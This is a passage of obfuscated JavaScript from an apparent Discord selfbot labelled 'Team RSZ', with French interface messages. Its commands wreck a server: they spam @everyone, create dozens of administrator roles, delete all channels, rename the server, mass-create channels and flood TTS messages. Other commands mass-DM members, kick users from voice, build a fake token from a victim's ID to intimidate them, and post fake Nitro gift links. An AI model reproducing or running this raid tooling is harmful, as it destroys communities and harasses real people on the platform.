0x35b0b3['content'][_0x8a5b4f(0x57d)](prefix+_0x8a5b4f(0x488))){if(_0x35b0b3[_0x8a5b4f(0x208)])_0x35b0b3[_0x8a5b4f(0x246)]();let _0x5a0a4b=setInterval(function(){const _0x3a05dc=_0x8a5b4f;_0x35b0b3[_0x3a05dc(0x5e1)]['channels'][_0x3a05dc(0x1e7)](_0x285e38=>{const _0x4a8b3e=_0x3a05dc;if(_0x285e38[_0x4a8b3e(0x661)]===_0x4a8b3e(0x261))_0x285e38[_0x4a8b3e(0x678)]('@everyone\x20\x20\x0a\x20');},0x5dc);});}var _0x5acc26=['https://discord.gift/qBn6HkYcfVvD7Z9RxRQqU9sa',_0x8a5b4f(0x5db),_0x8a5b4f(0x49f),_0x8a5b4f(0x290),_0x8a5b4f(0x677),_0x8a5b4f(0x32e),_0x8a5b4f(0x616),_0x8a5b4f(0x2cc),_0x8a5b4f(0x302),_0x8a5b4f(0x2ad),_0x8a5b4f(0x3b4),_0x8a5b4f(0x5ab),_0x8a5b4f(0x1ed),_0x8a5b4f(0x227),_0x8a5b4f(0x63e),_0x8a5b4f(0x59a),_0x8a5b4f(0x234),_0x8a5b4f(0x1ec),_0x8a5b4f(0x321),_0x8a5b4f(0x605),'https://discord.gift/HcY3zFzCWBMnfKz3q3mZkEZn',_0x8a5b4f(0x3b0),_0x8a5b4f(0x410),_0x8a5b4f(0x533),'https://discord.gift/JpzRdAtxBFyhxazm7XyG7mGA'];if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+'mail')){if(_0x35b0b3[_0x8a5b4f(0x42b)]['id']===client[_0x8a5b4f(0x377)]['id']){_0x35b0b3[_0x8a5b4f(0x246)]();let _0x22149e=_0x35b0b3[_0x8a5b4f(0x610)]['users'][_0x8a5b4f(0x45d)]();var _0x4e08c8=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x4ea)]('mail\x20de\x20\x20'+client['user'][_0x8a5b4f(0x5e7)])['setDescription']('**email\x20:\x20**'+client[_0x8a5b4f(0x377)][_0x8a5b4f(0x5bc)])[_0x8a5b4f(0x248)](_0x35b0b3['author'][_0x8a5b4f(0x587)],_0x35b0b3[_0x8a5b4f(0x42b)]['avatarURL']);_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)](_0x4e08c8);}}if(_0x35b0b3['content']['startsWith'](prefix+_0x8a5b4f(0x40f))){if(_0x35b0b3['author']['id']===client[_0x8a5b4f(0x377)]['id']){if(!_0x1f6d08){_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x650));return;}let _0x59d2de=[_0x8a5b4f(0x4b3),'XnyXiA',_0x8a5b4f(0x4ad),'XXn_KA','Xiq-WQ'],_0x38df60=[_0x8a5b4f(0x292),'oZyGJDamSJ4hmJaaLvzdNo1bLqk',_0x8a5b4f(0x4b2),_0x8a5b4f(0x36e)];var _0x4680a7=_0x1f6d08['id'],_0x279fd5=utf8[_0x8a5b4f(0x440)](_0x4680a7),_0x5b6a1d=base64['encode'](_0x279fd5);let _0x1a1b3c=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x4ea)](_0x8a5b4f(0x538)+_0x1f6d08[_0x8a5b4f(0x587)])[_0x8a5b4f(0x6e4)](_0x5b6a1d+'.'+_0x59d2de[Math['floor'](Math[_0x8a5b4f(0x4ca)]()*_0x59d2de['length'])]+'.'+_0x38df60[Math['floor'](Math[_0x8a5b4f(0x4ca)]()*_0x38df60['length'])]);setTimeout(()=>{const _0x221b59=_0x8a5b4f;_0x35b0b3[_0x221b59(0x26f)](_0x221b59(0x5f4));},0x3e8),setTimeout(()=>{const _0x20f9ad=_0x8a5b4f;_0x35b0b3[_0x20f9ad(0x26f)](_0x20f9ad(0x3f3));},0x5dc),setTimeout(()=>{const _0x22869b=_0x8a5b4f;_0x35b0b3[_0x22869b(0x26f)](_0x22869b(0x3b9));},0x7d0),setTimeout(()=>{const _0x253f5d=_0x8a5b4f;_0x35b0b3[_0x253f5d(0x26f)](_0x253f5d(0x270));},0x9c4),setTimeout(()=>{const _0x217537=_0x8a5b4f;_0x35b0b3[_0x217537(0x26f)](_0x217537(0x200));},0xbb8),setTimeout(()=>{const _0x2a8fa1=_0x8a5b4f;_0x35b0b3[_0x2a8fa1(0x26f)](_0x2a8fa1(0x42d));},0xdac),setTimeout(()=>{const _0x49a11f=_0x8a5b4f;_0x35b0b3[_0x49a11f(0x26f)](_0x1a1b3c);},0xfa0),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x3c7)[_0x8a5b4f(0x647)]);}}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x50b))){if(_0x35b0b3[_0x8a5b4f(0x42b)]['id']==client[_0x8a5b4f(0x377)]['id']){_0x35b0b3[_0x8a5b4f(0x246)]();var _0x22b488=_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x534)]('\x20');let _0x1ea4c9=_0x22b488[0x0];var _0x106d51=_0x22b488[_0x8a5b4f(0x65a)](0x1),_0x21b472=_0x106d51[_0x8a5b4f(0x65a)](0x0)['join']('\x20');if(!_0x106d51)return _0x106d51[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)](_0x8a5b4f(0x63d));var _0x56e581=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x4ea)](_0x8a5b4f(0x621))[_0x8a5b4f(0x6e4)](_0x21b472)['setFooter']('Team\x20RSZ',_0x35b0b3[_0x8a5b4f(0x42b)]['avatarURL']);_0x35b0b3[_0x8a5b4f(0x396)]['send'](_0x56e581)[_0x8a5b4f(0x1d9)](function(_0x4c0152){_0x4c0152['react']('✅'),_0x4c0152['react']('❌');});}else _0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)](nowhite);}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x1f1))){if(_0x35b0b3[_0x8a5b4f(0x42b)]['id']===client[_0x8a5b4f(0x377)]['id']){let _0x310de3=_0x35b0b3['guild'];if(!_0x310de3)return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x1ff));const _0x29e4a9=_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e0)],_0x26a876=_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x534)]('\x20')[_0x8a5b4f(0x65a)](0x1)['join']('\x20');!_0x26a876[0x0]&&(_0x35b0b3[_0x8a5b4f(0x246)](),console[_0x8a5b4f(0x32b)]('[','ERROR'[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x3aa))),_0x29e4a9[_0x8a5b4f(0x1e7)](_0x435a55=>{const _0x2e0d2e=_0x8a5b4f;_0x435a55[_0x2e0d2e(0x678)](_0x26a876)['catch'](_0x2c15ec=>console[_0x2e0d2e(0x32b)]('[',_0x2e0d2e(0x391)['red'],']',_0x2e0d2e(0x41a)['green']));var _0x5318be=new Discord[(_0x2e0d2e(0x2e8))]()[_0x2e0d2e(0x4ea)](_0x2e0d2e(0x405)+_0x26a876)[_0x2e0d2e(0x279)]()[_0x2e0d2e(0x39b)](color)[_0x2e0d2e(0x248)](_0x2e0d2e(0x1fe),_0x35b0b3[_0x2e0d2e(0x42b)][_0x2e0d2e(0x355)]);_0x35b0b3[_0x2e0d2e(0x26f)](_0x5318be);});}else _0x35b0b3[_0x8a5b4f(0x26f)](nowhite);}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x559))){if(_0x35b0b3[_0x8a5b4f(0x42b)]['id']==client['user']['id']){let _0x498bdc=_0x35b0b3[_0x8a5b4f(0x5e1)];if(!_0x498bdc)return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x1ff));_0x35b0b3[_0x8a5b4f(0x246)]();for(var _0x5ef861=0x0;_0x5ef861<0x5a;_0x5ef861++){_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x696)]({'name':'Team\x20RSZ','mentionable':![],'permissions':0x8,'position':'','color':_0x8a5b4f(0x645)});}}}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+'destroy'){if(_0x35b0b3[_0x8a5b4f(0x208)])_0x35b0b3[_0x8a5b4f(0x246)]();_0x35b0b3[_0x8a5b4f(0x42b)]['id']==client['user']['id']&&_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e0)][_0x8a5b4f(0x1e7)](_0x4ae558=>{const _0x1efc62=_0x8a5b4f;_0x4ae558[_0x1efc62(0x3ad)]()[_0x1efc62(0x1d9)](function(){});});if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x29a))){if(_0x35b0b3['author']['id']==client[_0x8a5b4f(0x377)]['id']){_0x35b0b3[_0x8a5b4f(0x246)]();for(var _0x5ef861=0x0;_0x5ef861<0x5a;_0x5ef861++){_0x35b0b3['guild'][_0x8a5b4f(0x696)]({'name':_0x8a5b4f(0x1fe),'mentionable':![],'permissions':0x0,'position':'','color':_0x8a5b4f(0x645)});}}}}if(_0x35b0b3['content']===prefix+_0x8a5b4f(0x29a)){if(_0x35b0b3[_0x8a5b4f(0x208)])_0x35b0b3['delete']();if(_0x35b0b3[_0x8a5b4f(0x42b)]['id']==client[_0x8a5b4f(0x377)]['id']){if(_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x661)]==='dm')return;if(_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e6)][_0x8a5b4f(0x3ed)]===0x0)return;}}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+'destroy'){if(_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x661)]==='dm')return;if(_0x35b0b3['author']['id']==client[_0x8a5b4f(0x377)]['id']){_0x35b0b3[_0x8a5b4f(0x5e1)]['name']!=_0x8a5b4f(0x1fe)&&(_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x1d2)](_0x8a5b4f(0x433))['catch'](_0x68459f=>{}),_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x35f)](_0x8a5b4f(0x1fe))[_0x8a5b4f(0x4d5)](_0x577713=>{}),_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x5e6)](_0x8a5b4f(0x257))['catch'](_0x58039c=>{}));setInterval(function(){const _0xbe9ee7=_0x8a5b4f;_0x35b0b3['guild']['channels'][_0xbe9ee7(0x3ed)]<0x1f3&&_0x35b0b3[_0xbe9ee7(0x5e1)][_0xbe9ee7(0x47e)]('Team\x20RSZ',_0xbe9ee7(0x261))[_0xbe9ee7(0x4d5)](_0x330aac=>{});},0x190);if(_0x35b0b3[_0x8a5b4f(0x208)])_0x35b0b3[_0x8a5b4f(0x246)]();}}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x29a)){if(_0x35b0b3[_0x8a5b4f(0x396)]['type']==='dm')return;_0x35b0b3[_0x8a5b4f(0x42b)]['id']==client['user']['id']&&setInterval(function(){const _0x328087=_0x8a5b4f;_0x35b0b3[_0x328087(0x396)]['send'](_0x328087(0x2b1)+_0x328087(0x53c)+'\x0a'+'Team\x20RSZ',{'tts':!![]})['catch'](_0x8243e4=>{});},0x190);}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+'unbanall'){let _0x2aeaf8=_0x35b0b3[_0x8a5b4f(0x5e1)];if(!_0x2aeaf8)return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x1ff));if(_0x35b0b3[_0x8a5b4f(0x208)])_0x35b0b3[_0x8a5b4f(0x246)]();let _0x5e14f0=setInterval(function(){const _0x110221=_0x8a5b4f;_0x35b0b3['guild'][_0x110221(0x4d8)]()[_0x110221(0x1d9)](_0xd0860a=>{const _0x33b3ca=_0x110221;_0xd0860a[_0x33b3ca(0x1e7)](_0x3bf940=>{const _0x14bad0=_0x33b3ca;_0x35b0b3['guild'][_0x14bad0(0x336)](_0x3bf940['id']);});});},0x3e8);_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)](_0x8a5b4f(0x272));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x479))){if(!_0x1f6d08){_0x35b0b3['edit'](':x:\x20**Veuillez\x20mentionner\x20un\x20utilisateur!**');return;}let _0x56cba1=new Discord[(_0x8a5b4f(0x2e8))]();_0x56cba1[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x4ea)]('**'+client[_0x8a5b4f(0x377)]['username']+_0x8a5b4f(0x243)+_0x1f6d08[_0x8a5b4f(0x587)]+'**')[_0x8a5b4f(0x279)]()[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3))[_0x8a5b4f(0x6ae)](pat[Math[_0x8a5b4f(0x49c)](Math[_0x8a5b4f(0x4ca)]()*pat[_0x8a5b4f(0x3f6)])]),_0x35b0b3[_0x8a5b4f(0x26f)](_0x56cba1)[_0x8a5b4f(0x4d5)](_0x32957c=>console[_0x8a5b4f(0x32b)]('[','ERROR'[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console['log'](_0x8a5b4f(0x5e3)),console['log']('╟─────────────────────────────────╢');}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x656))){if(!_0x1f6d08){_0x35b0b3['edit'](':x:\x20**Veuillez\x20mentionner\x20un\x20utilisateur!**');return;}let _0xdf69f2=new Discord[(_0x8a5b4f(0x2e8))]();_0xdf69f2[_0x8a5b4f(0x39b)](color)['setTitle']('**'+client[_0x8a5b4f(0x377)][_0x8a5b4f(0x587)]+_0x8a5b4f(0x2de)+_0x1f6d08['username']+'**')[_0x8a5b4f(0x279)]()['setFooter'](_0x8a5b4f(0x4f3))[_0x8a5b4f(0x6ae)](highfive[Math[_0x8a5b4f(0x49c)](Math[_0x8a5b4f(0x4ca)]()*pat['length'])]),_0x35b0b3[_0x8a5b4f(0x26f)](_0xdf69f2)[_0x8a5b4f(0x4d5)](_0x1da579=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console['log'](_0x8a5b4f(0x606)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3['content']['startsWith'](prefix+_0x8a5b4f(0x2e2))){let _0x30f968=new Discord[(_0x8a5b4f(0x2e8))]();_0x30f968[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x4ea)]('**'+client[_0x8a5b4f(0x377)][_0x8a5b4f(0x587)]+_0x8a5b4f(0x4dd))[_0x8a5b4f(0x279)]()[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3))[_0x8a5b4f(0x6ae)](cry[Math[_0x8a5b4f(0x49c)](Math[_0x8a5b4f(0x4ca)]()*pat[_0x8a5b4f(0x3f6)])]),_0x35b0b3[_0x8a5b4f(0x26f)](_0x30f968)['catch'](_0x572bac=>console['log']('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'['green'])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x436)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3['content']['startsWith'](prefix+_0x8a5b4f(0x511))){_0x35b0b3[_0x8a5b4f(0x246)](),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20mp\x20all\x20executé'),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');let _0x380893=_0x106d51[_0x8a5b4f(0x217)](0x2)['join']('\x20')||_0x8a5b4f(0x569),_0x5be99e=_0x35b0b3['guild'];if(!_0x5be99e)return;setInterval(()=>{const _0x4ecc68=_0x8a5b4f;let _0x3b715b=_0x5be99e[_0x4ecc68(0x2e0)][_0x4ecc68(0x4ca)]();if(_0x3b715b[_0x4ecc68(0x377)][_0x4ecc68(0x512)])return;if(_0x3b715b[_0x4ecc68(0x377)]['id']===client[_0x4ecc68(0x377)]['id'])return;if(db[_0x3b715b[_0x4ecc68(0x377)]['id']])return;_0x3b715b[_0x4ecc68(0x678)](_0x380893+'')[_0x4ecc68(0x4d5)](_0x2aea4a=>console[_0x4ecc68(0x32b)]('[',_0x4ecc68(0x391)[_0x4ecc68(0x5fb)],']',_0x4ecc68(0x41a)['green'])),console[_0x4ecc68(0x32b)](_0x3b715b[_0x4ecc68(0x377)][_0x4ecc68(0x587)]+_0x4ecc68(0x679)),db[_0x3b715b[_0x4ecc68(0x377)]['id']]={'raison':'mp'},saver();},0x1c2);}_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x47d))&&(client[_0x8a5b4f(0x29a)]()[_0x8a5b4f(0x1d9)](()=>client[_0x8a5b4f(0x59b)](token)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x4e1)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)));if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+'auto\x20voice\x20kick')){if(!_0x35b0b3['guild']['me']['hasPermission'](_0x8a5b4f(0x598)))return _0x35b0b3[_0x8a5b4f(0x5ef)](_0x8a5b4f(0x503));const _0x238162=_0x35b0b3[_0x8a5b4f(0x610)]['members']['first']();if(!_0x238162)return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x68c));kicked[_0x35b0b3['guild']['id']]={'user':_0x238162['id']},kicker(),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20auto\x20voice\x20kick\x20executé'),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢'),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x30e));if(!_0x238162['voiceChannel'])return;_0x238162['setVoiceChannel'](null);}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x348))){const _0x2ceab1=_0x35b0b3[_0x8a5b4f(0x610)][_0x8a5b4f(0x2e0)][_0x8a5b4f(0x45d)]();if(!_0x2ceab1)return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x68c));delete kicked[_0x35b0b3[_0x8a5b4f(0x5e1)]['id']][_0x8a5b4f(0x377)],kicker(),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x54c)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x4b6)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+'voice\x20kick')){if(!_0x35b0b3[_0x8a5b4f(0x5e1)])return _0x35b0b3['edit'](_0x8a5b4f(0x687));if(!_0x35b0b3[_0x8a5b4f(0x5e1)]['me']['hasPermission']('MOVE_MEMBERS'))return _0x35b0b3['reply'](_0x8a5b4f(0x503));const _0x351d63=_0x35b0b3['mentions']['members'][_0x8a5b4f(0x45d)]();if(!_0x351d63)return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x68c));if(!_0x351d63[_0x8a5b4f(0x3a3)])return _0x35b0b3['edit'](_0x8a5b4f(0x25e));_0x351d63[_0x8a5b4f(0x3b3)](null)[_0x8a5b4f(0x4d5)](_0x7cefa1=>_0x35b0b3['edit'](_0x8a5b4f(0x25e))),_0x35b0b3['edit'](':white_check_mark:\x20**L\x27utilisateur\x20a\x20été\x20voice\x20kick\x20correctement**'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x5dc)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');};if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+'afk')){let _0x399283=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x3d2);afk[client['user']['id']]={'activé':_0x8a5b4f(0x522),'r':_0x399283},saving(),_0x35b0b3['edit'](':white_check_mark:\x20**Vous\x20etes\x20afk\x20pour**\x20'+_0x399283),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x40a)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));};if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x1fd))){let _0x137fc5=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||'𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉';rpcGenerator[_0x8a5b4f(0x5d9)]('603405368940429315',_0x8a5b4f(0x1fd))[_0x8a5b4f(0x1d9)](_0x2985ee=>{const _0xa1219e=_0x8a5b4f;rpcGenerator[_0xa1219e(0x5d9)](_0xa1219e(0x281),_0xa1219e(0x1cb))[_0xa1219e(0x1d9)](_0x3fee59=>{const _0x17238a=_0xa1219e;let _0x14f89c=new rpcGenerator['Rpc']()[_0x17238a(0x35f)](_0x17238a(0x604))[_0x17238a(0x432)](_0x17238a(0x430))[_0x17238a(0x2f4)](_0x17238a(0x3dd))[_0x17238a(0x4c5)](_0x17238a(0x281))[_0x17238a(0x685)](_0x17238a(0x604))[_0x17238a(0x231)](_0x2985ee['id'])[_0x17238a(0x413)](_0x3fee59['id'])[_0x17238a(0x62f)](_0x17238a(0x4f3))[_0x17238a(0x204)](_0x137fc5)[_0x17238a(0x458)](Date[_0x17238a(0x51b)]())[_0x17238a(0x2d8)]({'id':uuid()});client[_0x17238a(0x377)][_0x17238a(0x695)](_0x14f89c['toDiscord']())[_0x17238a(0x4d5)](console[_0x17238a(0x55f)]),console[_0x17238a(0x32b)]('╟\x20Comande\x20Gucci\x20executé'),console[_0x17238a(0x32b)](_0x17238a(0x59d)),_0x35b0b3['edit'](_0x17238a(0x6d7)+_0x137fc5+_0x17238a(0x62d));});});}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x239))){let _0x533622=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator['getRpcImage'](_0x8a5b4f(0x281),_0x8a5b4f(0x239))['then'](_0xe49a66=>{const _0x17baab=_0x8a5b4f;let _0x29d537=new rpcGenerator[(_0x17baab(0x6a4))]()['setName'](_0x17baab(0x6a1))[_0x17baab(0x432)](_0x17baab(0x430))[_0x17baab(0x2f4)](_0x17baab(0x3dd))[_0x17baab(0x4c5)](_0x17baab(0x281))[_0x17baab(0x685)]('Lacoste')[_0x17baab(0x231)](_0xe49a66['id'])[_0x17baab(0x62f)](_0x17baab(0x4f3))[_0x17baab(0x204)](_0x533622)[_0x17baab(0x458)](Date[_0x17baab(0x51b)]())[_0x17baab(0x2d8)]({'id':uuid()});client['user'][_0x17baab(0x695)](_0x29d537[_0x17baab(0x694)]())['catch'](console['error']),console[_0x17baab(0x32b)](_0x17baab(0x359)),console['log'](_0x17baab(0x59d)),_0x35b0b3[_0x17baab(0x26f)](_0x17baab(0x6d7)+_0x533622+'\x20sur\x20lacoste**');});}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+'nike')){let _0x690537=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||'𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉';rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),_0x8a5b4f(0x30c))[_0x8a5b4f(0x1d9)](_0x471b54=>{const _0x39d14f=_0x8a5b4f;let _0x130d83=new rpcGenerator['Rpc']()[_0x39d14f(0x35f)]('Nike')[_0x39d14f(0x432)](_0x39d14f(0x430))['setType']('WATCHING')[_0x39d14f(0x4c5)]('603405368940429315')['setDetails'](_0x39d14f(0x49b))[_0x39d14f(0x231)](_0x471b54['id'])[_0x39d14f(0x62f)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')[_0x39d14f(0x204)](_0x690537)[_0x39d14f(0x458)](Date[_0x39d14f(0x51b)]())['setParty']({'id':uuid()});client[_0x39d14f(0x377)][_0x39d14f(0x695)](_0x130d83['toDiscord']())[_0x39d14f(0x4d5)](console[_0x39d14f(0x55f)]),console[_0x39d14f(0x32b)]('╟\x20Commande\x20Nike\x20executé'),console[_0x39d14f(0x32b)](_0x39d14f(0x59d)),_0x35b0b3[_0x39d14f(0x26f)](_0x39d14f(0x6d7)+_0x690537+_0x39d14f(0x532));});}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x49e))){let _0x28da63=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||'𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉';rpcGenerator[_0x8a5b4f(0x5d9)](_0x8a5b4f(0x281),'google')['then'](_0x824fa7=>{const _0x4aa137=_0x8a5b4f;let _0x2b29ff=new rpcGenerator[(_0x4aa137(0x6a4))]()[_0x4aa137(0x35f)](_0x4aa137(0x4a1))['setUrl'](_0x4aa137(0x430))[_0x4aa137(0x2f4)](_0x4aa137(0x3dd))[_0x4aa137(0x4c5)](_0x4aa137(0x281))[_0x4aa137(0x685)](_0x4aa137(0x4a1))[_0x4aa137(0x231)](_0x824fa7['id'])['setAssetsLargeText'](_0x4aa137(0x4f3))[_0x4aa137(0x204)](_0x28da63)[_0x4aa137(0x458)](Date['now']())[_0x4aa137(0x2d8)]({'id':uuid()});client[_0x4aa137(0x377)][_0x4aa137(0x695)](_0x2b29ff[_0x4aa137(0x694)]())['catch'](console['error']),console[_0x4aa137(0x32b)](_0x4aa137(0x2c8)),console['log'](_0x4aa137(0x59d)),_0x35b0b3['edit'](_0x4aa137(0x6d7)+_0x28da63+_0x4aa137(0x37e));});}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x2a5))){let _0x32d203=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)]('603405368940429315','skype')['then'](_0x541a98=>{const _0x520bf5=_0x8a5b4f;let _0x10d1ad=new rpcGenerator[(_0x520bf5(0x6a4))]()['setName'](_0x520bf5(0x309))[_0x520bf5(0x432)](_0x520bf5(0x430))[_0x520bf5(0x2f4)](_0x520bf5(0x3dd))[_0x520bf5(0x4c5)](_0x520bf5(0x281))['setDetails'](_0x520bf5(0x309))[_0x520bf5(0x231)](_0x541a98['id'])[_0x520bf5(0x62f)](_0x520bf5(0x4f3))['setState'](_0x32d203)['setStartTimestamp'](Date[_0x520bf5(0x51b)]())['setParty']({'id':uuid()});client[_0x520bf5(0x377)]['setPresence'](_0x10d1ad[_0x520bf5(0x694)]())[_0x520bf5(0x4d5)](console['error']),console['log'](_0x520bf5(0x222)),console[_0x520bf5(0x32b)]('╟─────────────────────────────────╢'),_0x35b0b3[_0x520bf5(0x26f)](_0x520bf5(0x6d7)+_0x32d203+_0x520bf5(0x36a));});}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+'snapchat')){let _0x513314=_0x106d51['splice'](0x1)['join']('\x20')||_0x8a5b4f(0x4f3);rpcGenerator[_0x8a5b4f(0x5d9)]('603405368940429315','snapchat')[_0x8a5b4f(0x1d9)](_0x224bef=>{const _0x1bb05d=_0x8a5b4f;let _0x327042=new rpcGenerator['Rpc']()[_0x1bb05d(0x35f)](_0x1bb05d(0x2bb))[_0x1bb05d(0x432)](_0x1bb05d(0x430))[_0x1bb05d(0x2f4)](_0x1bb05d(0x3dd))['setApplicationId'](_0x1bb05d(0x281))[_0x1bb05d(0x685)](_0x1bb05d(0x2bb))['setAssetsLargeImage'](_0x224bef['id'])['setAssetsLargeText']('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉')[_0x1bb05d(0x204)](_0x513314)[_0x1bb05d(0x458)](Date['now']())[_0x1bb05d(0x2d8)]({'id':uuid()});client['user'][_0x1bb05d(0x695)](_0x327042[_0x1bb05d(0x694)]())[_0x1bb05d(0x4d5)](console[_0x1bb05d(0x55f)]),console[_0x1bb05d(0x32b)](_0x1bb05d(0x249)),console[_0x1bb05d(0x32b)](_0x1bb05d(0x59d)),_0x35b0b3['edit'](_0x1bb05d(0x6d7)+_0x513314+_0x1bb05d(0x68d));});}if(_0x35b0b3['content'][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x5a7))){let _0x2f2f39=_0x106d51[_0x8a5b4f(0x217)](0x1)['join']('\x20')||_0x8a5b4f(0x4f3);rpcGenerator['getRpcImage'](_0x8a5b4f(0x281),_0x8a5b4f(0x5a7))[_0x8a5b4f(0x1d9)](_0x358490=>{const _0x3c5618=_0x8a5b4f;let _0x24f99a=new 